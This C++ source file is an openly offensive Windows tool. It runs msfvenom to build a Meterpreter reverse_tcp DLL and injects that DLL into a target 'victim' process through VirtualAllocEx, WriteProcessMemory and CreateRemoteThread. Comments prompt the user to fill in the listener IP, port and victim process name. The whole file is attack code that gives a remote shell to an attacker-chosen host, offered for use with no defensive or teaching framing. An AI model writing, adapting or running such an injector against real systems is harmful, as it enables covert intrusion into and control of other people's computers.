#include <iostream>
#include <cstdlib>
#include <string>
#include <windows.h>
#include <tlhelp32.h>

#define PAYLOAD "windows/x64/meterpreter/reverse_tcp"
#define LHOST "0.0.0.0" // ⚠️ Replace with your desired IP address
#define LPORT 9999 // ⚠️ Replace with your desired port number
#define TARGET_PROCESS "notepad.exe" // ⚠️ Replace with your desired target/victim process name

typedef BOOL(WINAPI* ReflectiveLoader)();

class MetasploitDLLGenerator {
public:
    MetasploitDLLGenerator(const std::string& payload, const std::string& lhost, int lport)
        : payload_(payload), lhost_(lhost), lport_(lport) {}
    
    bool GenerateAndInjectDLL(const std::string& outputFilename, const std::string& targetProcessName) {
        std::string command = "msfvenom -p " + payload_ + " LHOST=" + lhost_ + " LPORT=" + std::to_string(lport_) +
                              " -f dll -o " + outputFilename;

        int result = std::system(command.c_str());
        if (result != 0) {
            std::cout << "Failed to generate Metasploit DLL." << std::endl;
            return false;
        }

        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(targetProcessName));
        if (hProcess == NULL) {
            std::cout << "Failed to open the target process." << std::endl;
            return false;
        }

        LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, outputFilename.size(), MEM_COMMIT, PAGE_READWRITE);
        if (pRemoteBuf == NULL) {
            std::cout << "Failed to allocate memory in the target process." << std::endl;
            CloseHandle(hProcess);
            return false;
        }

        if (!WriteProcessMemory(hProcess, pRemoteBuf, outputFilename.c_str(), outputFilename.size(), NULL)) {
            std::cout << "Failed to write DLL path to the target process." << std::endl;
            VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteBuf, 0, NULL);
        if (hThread == NULL) {
            std::cout << "Failed to create a remote thread in the target process." << std::endl;
            VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        WaitForSingleObject(hThread, INFINITE);

        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hThread);
        CloseHandle(hProcess);

        std::cout << "Successfully injected Metasploit DLL." << std::endl;
        return true;
    }

private:
    std::string payload_;
    std::string lhost_;
    int lport_;

    DWORD GetProcessIdByName(const std::string& processName) {
        DWORD processId = 0;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    if (processName.compare(pe32.szExeFile) == 0) {
                        processId = pe32.th32ProcessID;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
        }
        CloseHandle(hSnapshot);
        return processId;
    }
};

int main() {
    std::string payload = PAYLOAD;
    std::string lhost = LHOST;
    int lport = LPORT;
    
    std::string targetProcess = TARGET_PROCESS;

    MetasploitDLLGenerator generator(payload, lhost, lport);
    bool success = generator.GenerateAndInjectDLL("metasploit.dll", targetProcess);
    if (!success) {
        std::cout << "Failed to generate and inject Metasploit DLL." << std::endl;
        return 1;
    }

    return EXIT_SUCCESS;
}
